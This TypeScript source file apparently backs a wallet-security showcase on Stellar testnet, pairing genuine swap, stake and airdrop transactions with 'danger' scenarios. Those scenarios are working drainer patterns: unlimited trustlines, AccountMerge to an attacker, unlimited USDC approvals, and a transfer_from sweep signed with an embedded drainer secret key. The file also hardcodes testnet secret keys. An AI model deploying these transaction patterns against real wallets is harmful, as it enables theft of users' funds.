/**
 * Showcase demo transaction builders (Stellar build).
 *
 * Every scenario here is a real, submittable, on-chain transaction — none
 * of them are facades. "Safe" scenarios do the thing the site claims:
 * NovaSwap really swaps XLM for USDC on the live testnet DEX order book;
 * OrbitYield really locks XLM in a claimable balance; PixelDrop, ClaimHub
 * and LaunchPad really issue their own classic demo assets (PHNTM, LUMA,
 * NOVA) to the user's wallet. "Danger" scenarios reach for real Stellar
 * attack primitives: unlimited trustlines, AccountMerge to an attacker
 * address, an unlimited Soroban allowance on the real USDC asset contract,
 * and a real payment straight to an unrecognized address.
 *
 * The three classic-asset scenarios (PixelDrop/ClaimHub/LaunchPad "safe")
 * need a second signature: the demo issuer account has to authorize the
 * `payment` operation that sends its own asset. `DEMO_ISSUER` below is a
 * throwaway testnet-only keypair with no real value and no purpose beyond
 * signing these three ops — embedding its secret here is intentional, the
 * same way `analyze.ts`'s demo API key is intentionally public. `finish()`
 * co-signs with it before returning the XDR; Baret's own `signTransaction`
 * round-trips the envelope (decode → sign → encode) and appends the
 * user's signature on top without disturbing this one, so both signatures
 * land in the same submitted transaction.
 *
 * The returned XDR is otherwise unsigned; whichever wallet is connected
 * signs and submits it. When that's Baret, its own popup runs the real
 * analysis pipeline before it signs — nothing on the site pre-checks it.
 */

import {
  Address,
  Asset,
  BASE_FEE,
  Claimant,
  Contract,
  Horizon,
  Keypair,
  Memo,
  nativeToScVal,
  Networks,
  Operation,
  rpc,
  TransactionBuilder,
  xdr,
  type Networks as NetworksType,
} from "@stellar/stellar-sdk";

export type ScenarioId =
  | "novaswap-safe"
  | "novaswap-danger"
  | "pixeldrop-safe"
  | "pixeldrop-danger"
  | "orbityield-safe"
  | "orbityield-warn"
  | "claimhub-safe"
  | "claimhub-danger"
  | "launchpad-safe"
  | "launchpad-danger";

const HORIZON_TESTNET = "https://horizon-testnet.stellar.org";
const SOROBAN_RPC_TESTNET = "https://soroban-testnet.stellar.org";
const NETWORK_PASSPHRASE: NetworksType = Networks.TESTNET;

// Circle USDC — the same asset referenced by the danger scenarios below,
// both forms: classic (for the real DEX swap) and its Soroban Asset
// Contract wrapper (for the unlimited-approve attack).
const USDC_ISSUER = "GBBD47IF6LWK7P7MDEVSCWR7DPUWV3NY3DTQEVFL4NAT4AQH3ZLLFLA5";
const USDC_CLASSIC = new Asset("USDC", USDC_ISSUER);
const USDC_SAC_TESTNET =
  "CBIELTK6YBZJU5UP2WWQEUCYKLPU6AUNZ2BQ4WWFEIE3USCIHMXQDAMA";

// Demo token issuer. Testnet-only, funded via friendbot, holds no asset of
// real value — see file header. Issues PHNTM (PixelDrop), LUMA (ClaimHub),
// NOVA (LaunchPad).
const DEMO_ISSUER = Keypair.fromSecret(
  "SCHGMLONQHTLBFIBJK75MEZFPF3ZJOPXULEKHZU3TJ6MBETJ6XC6WXQ5",
);
const PHNTM = new Asset("PHNTM", DEMO_ISSUER.publicKey());
const LUMA = new Asset("LUMA", DEMO_ISSUER.publicKey());
const NOVA = new Asset("NOVA", DEMO_ISSUER.publicKey());
// Trust limit for the demo assets above: generous, but a real bound rather
// than the int64-max "unlimited" sentinel the danger scenarios use.
const DEMO_ASSET_TRUST_LIMIT = "1000000";

// Synthetic attacker/unknown addresses for danger scenarios. Real,
// validly-encoded testnet keypairs — recognizable as untrusted because
// they're not on any known-safe allowlist. (Must be real StrKey
// addresses, not placeholder strings — the SDK rejects anything that
// isn't a validly checksummed address at build time.)
//
// NOVASWAP_DRAINER's secret is intentionally kept (unlike a "nobody holds
// the key" drainer address) so `simulateDrainerSweep` below can actually
// play out the second half of the attack: once NovaSwap's danger scenario
// grants it an unlimited USDC allowance, this is the same key that would,
// for real, pull the balance later without asking again. Demonstrating
// that follow-through is the whole point — an approval that never gets
// exercised doesn't show why it was dangerous to sign.
const NOVASWAP_DRAINER = Keypair.fromSecret(
  "SAJ4C3WYHOHZRGO7CB7C7EXE7QK7E3434CGNVZYHY7JFAY2X5CTNAJVL",
);
const FAKE_LAUNCH_ADDRESS =
  "GCJLJNITXN6KLTF2AIFT7VWOU2MAVG6D32YVIC7VAKR2F3METF2CQU2Y";
const ATTACKER_ACCOUNT =
  "GATEOM52PKBR4PQISO326PP2UIF4NRZGLRGJ2FVFVJP4NILABZYGW2B6";

// changeTrust's `limit` is a decimal string (up to 7 fractional digits), not
// raw stroops — this is int64-max stroops (9223372036854775807) expressed in
// that decimal form, i.e. the trustline "unlimited" sentinel.
const STELLAR_UNLIMITED_TRUSTLINE = "922337203685.4775807";
const SOROBAN_UNLIMITED_AMOUNT = (2n ** 127n - 1n).toString();
// A Soroban allowance's `live_until_ledger` can't be set further out than
// the network's max entry TTL (~3,110,400 ledgers, ~6 months at 5s/ledger)
// past the current ledger. It's an absolute ledger number, so it has to be
// computed from the current ledger at build time, not hardcoded.
const MAX_APPROVAL_TTL_LEDGERS = 3_100_000;
// How long OrbitYield's "stake" locks XLM before it can be claimed back.
// Short on purpose — this is a demo, not a real 30-day unbond.
const STAKE_LOCK_SECONDS = 5 * 60;

export interface BuiltScenario {
  /** Base64 unsigned (or, for the 3 co-signed cases, partially-signed) TransactionEnvelope XDR. */
  transactionXdr: string;
  /** Short human description of the scenario. */
  label: string;
}

export interface ScenarioParams {
  /** XLM amount for the primary action (swap send amount, stake amount, contribution). Decimal string. */
  amount?: string;
  /** Item count for scenarios priced per-unit (PixelDrop's mint quantity). */
  qty?: number;
}

/**
 * Build the candidate transaction for a given scenario. The user wallet's
 * `G…` address is required because Stellar transactions are anchored to the
 * source account's current sequence number, which we fetch from Horizon.
 */
export async function buildScenario(
  scenario: ScenarioId,
  userWallet: string,
  params: ScenarioParams = {},
): Promise<BuiltScenario> {
  const horizon = new Horizon.Server(HORIZON_TESTNET);
  const source = await horizon.loadAccount(userWallet).catch(() => {
    throw new Error(
      `Couldn't load ${userWallet} on testnet. Fund it via friendbot and try again.`,
    );
  });

  const builder = new TransactionBuilder(source, {
    fee: BASE_FEE,
    networkPassphrase: NETWORK_PASSPHRASE,
  });

  switch (scenario) {
    case "novaswap-safe": {
      // Real swap: establish (or no-op confirm) the USDC trustline, then
      // route the XLM straight through the live testnet DEX order book.
      // destMin is nominal rather than a tight slippage bound — a demo
      // should not intermittently fail because the book moved between
      // building and signing.
      const sendAmount = params.amount?.trim() || "0.5";
      return finish(
        builder
          .addOperation(
            Operation.changeTrust({
              asset: USDC_CLASSIC,
              limit: DEMO_ASSET_TRUST_LIMIT,
            }),
          )
          .addOperation(
            Operation.pathPaymentStrictSend({
              sendAsset: Asset.native(),
              sendAmount,
              destination: userWallet,
              destAsset: USDC_CLASSIC,
              destMin: "0.0000001",
            }),
          )
          .addMemo(Memo.text("novaswap:safe-swap")),
        `NovaSwap: swap ${sendAmount} XLM → USDC on the testnet DEX`,
      );
    }

    case "novaswap-danger":
      // Soroban transactions can't carry a classic memo.
      return finish(
        builder.addOperation(
          sorobanInvoke(USDC_SAC_TESTNET, "approve", [
            addressArg(userWallet),
            addressArg(NOVASWAP_DRAINER.publicKey()),
            i128Arg(SOROBAN_UNLIMITED_AMOUNT),
            u32Arg(await approvalExpirationLedger()),
          ]),
        ),
        "NovaSwap: unlimited USDC approve to a stranger contract",
        { soroban: true },
      );

    case "pixeldrop-safe": {
      // Real mint: pay the real XLM price, receive real PHNTM tokens
      // (fungible receipts standing in for individually-numbered NFTs —
      // real value transfer either way, on-chain and verifiable).
      const qty = Math.max(1, Math.min(5, params.qty ?? 1));
      const priceXlm = (25 * qty).toFixed(7);
      return finish(
        builder
          .addOperation(
            Operation.changeTrust({ asset: PHNTM, limit: DEMO_ASSET_TRUST_LIMIT }),
          )
          .addOperation(
            Operation.payment({
              destination: userWallet,
              asset: PHNTM,
              amount: qty.toFixed(7),
              source: DEMO_ISSUER.publicKey(),
            }),
          )
          .addOperation(
            Operation.payment({
              destination: DEMO_ISSUER.publicKey(),
              asset: Asset.native(),
              amount: priceXlm,
            }),
          )
          .addMemo(Memo.text("pixeldrop:safe-mint")),
        `PixelDrop: mint ${qty} PHNTM for ${priceXlm} XLM`,
        { issuerSign: true },
      );
    }

    case "pixeldrop-danger":
      return finish(
        builder
          .addOperation(
            Operation.changeTrust({
              asset: new Asset("EVIL", ATTACKER_ACCOUNT),
              limit: STELLAR_UNLIMITED_TRUSTLINE,
            }),
          )
          .addMemo(Memo.text("pixeldrop:trust-evil-issuer")),
        "PixelDrop: unlimited trustline to an untrusted issuer",
      );

    case "orbityield-safe": {
      // Real stake: XLM actually leaves the spendable balance into a
      // claimable balance the user can only reclaim after the lock window
      // — the same primitive real Stellar liquid-staking-style lockups use.
      const amount = params.amount?.trim() || "1";
      return finish(
        builder
          .addOperation(
            Operation.createClaimableBalance({
              asset: Asset.native(),
              amount,
              claimants: [
                new Claimant(
                  userWallet,
                  Claimant.predicateNot(
                    Claimant.predicateBeforeRelativeTime(
                      STAKE_LOCK_SECONDS.toString(),
                    ),
                  ),
                ),
              ],
            }),
          )
          .addMemo(Memo.text("orbityield:safe-stake")),
        `OrbitYield: lock ${amount} XLM for ${STAKE_LOCK_SECONDS / 60} min`,
      );
    }

    case "orbityield-warn":
      return finish(
        builder
          .addOperation(
            Operation.payment({
              destination: ATTACKER_ACCOUNT,
              asset: Asset.native(),
              amount: "5.0000000",
            }),
          )
          .addMemo(Memo.text("orbityield:unverified-pool")),
        "OrbitYield: 5 XLM sent to an unverified pool address",
      );

    case "claimhub-safe":
      // Real airdrop: free, real LUMA lands in the user's wallet.
      return finish(
        builder
          .addOperation(
            Operation.changeTrust({ asset: LUMA, limit: DEMO_ASSET_TRUST_LIMIT }),
          )
          .addOperation(
            Operation.payment({
              destination: userWallet,
              asset: LUMA,
              amount: "2500.0000000",
              source: DEMO_ISSUER.publicKey(),
            }),
          )
          .addMemo(Memo.text("claimhub:airdrop-claim")),
        "ClaimHub: claim 2,500 LUMA (real airdrop)",
        { issuerSign: true },
      );

    case "claimhub-danger":
      return finish(
        builder
          .addOperation(
            Operation.accountMerge({
              destination: ATTACKER_ACCOUNT,
            }),
          )
          .addMemo(Memo.text("claimhub:account-drain")),
        "ClaimHub: AccountMerge. drains entire XLM balance to attacker",
      );

    case "launchpad-safe": {
      // Real contribution: pay real XLM into the sale, receive real NOVA
      // presale tokens back in the same atomic transaction. Internal demo
      // rate (1 XLM : 1,000 NOVA) — independent of the site's displayed
      // USD price, which is narrative copy for a fictional presale.
      const contributionXlm = params.amount?.trim() || "0.5000000";
      const novaOut = (parseFloat(contributionXlm) * 1000).toFixed(7);
      return finish(
        builder
          .addOperation(
            Operation.changeTrust({ asset: NOVA, limit: DEMO_ASSET_TRUST_LIMIT }),
          )
          .addOperation(
            Operation.payment({
              destination: DEMO_ISSUER.publicKey(),
              asset: Asset.native(),
              amount: contributionXlm,
            }),
          )
          .addOperation(
            Operation.payment({
              destination: userWallet,
              asset: NOVA,
              amount: novaOut,
              source: DEMO_ISSUER.publicKey(),
            }),
          )
          .addMemo(Memo.text("launchpad:presale-buy")),
        `LaunchPad: contribute ${contributionXlm} XLM for ${novaOut} NOVA`,
        { issuerSign: true },
      );
    }

    case "launchpad-danger":
      // Soroban transactions can't carry a classic memo.
      return finish(
        builder.addOperation(
          sorobanInvoke(USDC_SAC_TESTNET, "approve", [
            addressArg(userWallet),
            addressArg(FAKE_LAUNCH_ADDRESS),
            i128Arg(SOROBAN_UNLIMITED_AMOUNT),
            u32Arg(await approvalExpirationLedger()),
          ]),
        ),
        "LaunchPad: unlimited USDC approve to a stranger launch contract",
        { soroban: true },
      );
  }
}

/**
 * Plays out the second half of NovaSwap's danger scenario: once that
 * `approve` call has actually been signed and confirmed, an attacker
 * holding the approved spender key needs nothing further from the
 * victim — they just call the standard SEP-41 `transfer_from` and take
 * whatever's there. This is that call, signed and submitted entirely by
 * `NOVASWAP_DRAINER`'s own key. The user isn't involved: that's the
 * point of the demonstration. Sweeps the wallet's full current USDC
 * balance (capped by the granted allowance, though at this amount that
 * never binds).
 */
export async function simulateDrainerSweep(
  userWallet: string,
): Promise<{ hash: string; sweptAmount: string }> {
  const horizon = new Horizon.Server(HORIZON_TESTNET);
  const victim = await horizon.loadAccount(userWallet).catch(() => {
    throw new Error(`Couldn't load ${userWallet} on testnet.`);
  });
  const usdcRow = victim.balances.find(
    (b) =>
      b.asset_type !== "native" &&
      "asset_code" in b &&
      b.asset_code === "USDC" &&
      "asset_issuer" in b &&
      b.asset_issuer === USDC_ISSUER,
  );
  const sweptAmount = usdcRow && "balance" in usdcRow ? usdcRow.balance : "0";
  if (parseFloat(sweptAmount) <= 0) {
    throw new Error(
      "This wallet holds 0 USDC — nothing to sweep. Run the safe swap first so it actually has some, then try the danger scenario again.",
    );
  }

  const drainerAccount = await horizon
    .loadAccount(NOVASWAP_DRAINER.publicKey())
    .catch(() => {
      throw new Error(
        `Drainer account ${NOVASWAP_DRAINER.publicKey()} isn't funded on testnet.`,
      );
    });
  const builder = new TransactionBuilder(drainerAccount, {
    fee: BASE_FEE,
    networkPassphrase: NETWORK_PASSPHRASE,
  }).addOperation(
    sorobanInvoke(USDC_SAC_TESTNET, "transfer_from", [
      addressArg(NOVASWAP_DRAINER.publicKey()),
      addressArg(userWallet),
      addressArg(NOVASWAP_DRAINER.publicKey()),
      i128Arg(decimalToRaw(sweptAmount)),
    ]),
  );
  const tx = builder.setTimeout(60).build();
  const server = new rpc.Server(SOROBAN_RPC_TESTNET);
  const prepared = await server.prepareTransaction(tx);
  prepared.sign(NOVASWAP_DRAINER);
  const hash = await submitSignedTransaction(prepared.toXDR());
  return { hash, sweptAmount };
}

/**
 * Submit an already-signed transaction directly to Horizon. Used as the
 * fallback for wallets (Baret included) that only implement
 * `signTransaction`, not `signAndSendTransaction`.
 */
export async function submitSignedTransaction(signedTxXdr: string): Promise<string> {
  const horizon = new Horizon.Server(HORIZON_TESTNET);
  const tx = TransactionBuilder.fromXDR(signedTxXdr, NETWORK_PASSPHRASE);
  const result = await horizon.submitTransaction(tx);
  return result.hash;
}

/**
 * Classic operations (payment, changeTrust, accountMerge, …) submit as-is,
 * optionally co-signed by the demo issuer when the scenario sends one of
 * its assets. A Soroban `invokeHostFunction` needs its resource footprint
 * + fee simulated and attached first, or the network rejects it outright.
 */
async function finish(
  builder: TransactionBuilder,
  label: string,
  opts: { soroban?: boolean; issuerSign?: boolean } = {},
): Promise<BuiltScenario> {
  const tx = builder.setTimeout(60).build();

  if (opts.soroban) {
    const server = new rpc.Server(SOROBAN_RPC_TESTNET);
    const prepared = await server.prepareTransaction(tx);
    return { transactionXdr: prepared.toXDR(), label };
  }

  if (opts.issuerSign) {
    tx.sign(DEMO_ISSUER);
  }
  return { transactionXdr: tx.toXDR(), label };
}

async function approvalExpirationLedger(): Promise<number> {
  const server = new rpc.Server(SOROBAN_RPC_TESTNET);
  const { sequence } = await server.getLatestLedger();
  return sequence + MAX_APPROVAL_TTL_LEDGERS;
}

function sorobanInvoke(
  contractAddress: string,
  functionName: string,
  args: xdr.ScVal[],
): ReturnType<typeof Operation.invokeHostFunction> {
  const contract = new Contract(contractAddress);
  return contract.call(functionName, ...args);
}

/** Decimal asset-amount string (up to 7 fractional digits) → raw i128 units. */
function decimalToRaw(decimal: string): bigint {
  const [whole, frac = ""] = decimal.split(".");
  const fracPadded = (frac + "0000000").slice(0, 7);
  return BigInt(whole || "0") * 10_000_000n + BigInt(fracPadded || "0");
}

function addressArg(address: string): xdr.ScVal {
  return nativeToScVal(Address.fromString(address), { type: "address" });
}

function i128Arg(value: string | bigint): xdr.ScVal {
  return nativeToScVal(typeof value === "string" ? BigInt(value) : value, {
    type: "i128",
  });
}

function u32Arg(value: number): xdr.ScVal {
  return nativeToScVal(value, { type: "u32" });
}
